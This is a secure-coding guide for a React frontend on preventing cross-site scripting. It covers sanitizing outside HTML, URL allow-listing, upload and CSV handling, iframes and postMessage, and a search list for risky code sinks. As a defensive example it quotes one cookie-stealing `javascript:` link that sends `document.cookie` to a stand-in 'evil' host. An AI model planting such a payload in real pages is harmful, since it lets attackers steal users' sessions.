# XSS and outside content

Cross-site scripting (XSS) means attacker text runs as code in your page. It can
then read everything the user sees, call the API as them, and change the screen.
In React, XSS comes almost only through the escape routes below.

## HTML from outside

Rich text, markdown, CMS content, emails, chat messages and descriptions from
the API.

- Prefer showing it as text. Ask if the user really needs formatting.
- Markdown: use a renderer that does not pass raw HTML through (for
  `react-markdown`, keep the default and do not add `rehype-raw`).
- If HTML is needed: run `DOMPurify.sanitize(html)` right before rendering, in
  one shared `SafeHtml` component written in the project, never in many places.
  Allow only the tags and attributes the content needs.
- Sanitize at render time even if the server says it sanitized. The server's
  rules and the browser's rules can differ.
- Never sanitize and then change the string again (replace, concatenate). That
  can make it unsafe again.

## URLs from outside

React warns about `javascript:` URLs but still renders `href`. A link such as
`javascript:fetch('//evil?c='+document.cookie)` runs on click.

- Write a small `safeUrl(value)` helper in the project. Parse with
  `new URL(value, location.origin)`, and allow only `https:`, `http:`,
  `mailto:` and `tel:`. Return `undefined` otherwise.
- Use it for `href`, `src`, `action`, `formAction`, `window.open`, `location`
  assignments, and `<iframe src>`.
- Images from users: `https:` only, or `blob:` from your own file pickers.
- Mark links to user content with `rel="nofollow ugc noopener noreferrer"`.

## Other escape routes

| Pattern | Risk | Instead |
| --- | --- | --- |
| `ref.current.innerHTML = x`, `insertAdjacentHTML`, `document.write` | Runs HTML | React children, or `textContent` |
| `eval`, `new Function`, `setTimeout('code')` | Runs text | Real functions |
| `style={{ background: \`url(${userUrl})\` }}` | CSS injection, tracking | `safeUrl`, and allow only your own hosts |
| `<a href={user.website}>` | `javascript:` link | `safeUrl` |
| Spreading API objects into props (`{...apiData}`) | Can set `dangerouslySetInnerHTML` or `href` | Pick the fields |
| Chart, map or editor libraries with HTML tooltips or labels | Raw HTML from data | Text formatters, or sanitize |
| `new RegExp(userText)` | Very slow regex (ReDoS) | Escape the text first |

## Files and uploads

- `accept` and size checks in the browser are only for UX. The server checks the
  real type and size, and scans files.
- Show uploaded images through `<img>`. An SVG opened directly or put inline can
  run scripts.
- Never render uploaded HTML or SVG inline. Offer it as a download.
- File names from users are shown as text. Do not use them in URLs without
  `encodeURIComponent`.
- `URL.createObjectURL` is revoked after use.
- CSV export: cells starting with `=`, `+`, `-`, `@`, tab or carriage return get
  a leading `'`, or Excel runs them as formulas. The `utils/csv` of
  `frontend-core` does this. Check custom exports.

## iframes, windows, messages

- Embedding outside content: `<iframe sandbox="allow-scripts">` with as few
  extra `allow-*` values as possible. Never combine `allow-scripts` with
  `allow-same-origin` for content from the same site. Together they remove the
  sandbox.
- `postMessage` listener:

  ```ts
  const ALLOWED = new Set(['https://pay.example.com']);
  function onMessage(event: MessageEvent) {
    if (!ALLOWED.has(event.origin)) return;
    // then check the shape of event.data before use
  }
  ```

  Send with an exact `targetOrigin`, never `'*'` when the message has data.
- `window.open` to outside sites uses `noopener`. Never trust
  `window.opener`.
- This app inside other sites: block it with the `frame-ancestors` header
  (`headers-and-build.md`) to stop clickjacking.

## Third-party scripts (analytics, chat, ads, tag managers)

- Each one can do anything your code can. Add them only when the user asks, and
  list them in the README.
- Load them from npm when possible. From a CDN, use a pinned version with
  `integrity` and `crossorigin`.
- Tag managers let non-developers add scripts later. Say so to the user.
- Load them after consent where the law requires it (GDPR and cookie banners).

## Find it

Search the code (`src/`) and read every hit:

```text
dangerouslySetInnerHTML   innerHTML   outerHTML   insertAdjacentHTML   document.write
eval(   new Function(   setTimeout("   setInterval("
href={   src={   window.open(   location.href =   location.assign(   location.replace(
postMessage   addEventListener('message'   addEventListener("message"
<iframe   rehype-raw   allowDangerousHtml   createObjectURL
```

For each `href={` or `src={`: is the value a constant, a route, or data? Data
needs `safeUrl`.
